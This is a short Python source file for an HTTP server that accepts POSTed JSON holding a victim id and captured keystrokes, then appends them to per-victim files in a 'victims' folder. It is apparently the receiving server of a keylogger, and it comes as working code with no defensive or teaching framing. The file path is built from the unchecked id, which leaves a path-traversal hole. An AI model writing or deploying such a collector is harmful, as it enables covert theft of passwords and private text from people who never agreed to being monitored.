from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi
import time
from urllib.parse import unquote
import json

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    
    def do_POST(self):

        ctype,pdict = cgi.parse_header(self.headers.get_content_type())
        content_len = int(self.headers.get('Content-length'))
        mydata = json.loads(unquote(self.rfile.read(content_len).decode('utf-8')))
        with open(f"./victims/{mydata['id']}" + '.dat', "a") as f:
            f.write(mydata['keys']+'\n')
        print(mydata['id'],mydata['keys'])
        self.send_response(301)
        self.send_header("Content-Type", "text/html")
        self.end_headers()



            
hostName="0.0.0.0"
serverPort= 8080
webServer = HTTPServer((hostName, serverPort), Server)
print("Server started http://%s:%s" % (hostName, serverPort))

try:
    webServer.serve_forever()
except KeyboardInterrupt:
    pass

webServer.server_close()
print("Server stopped.")

    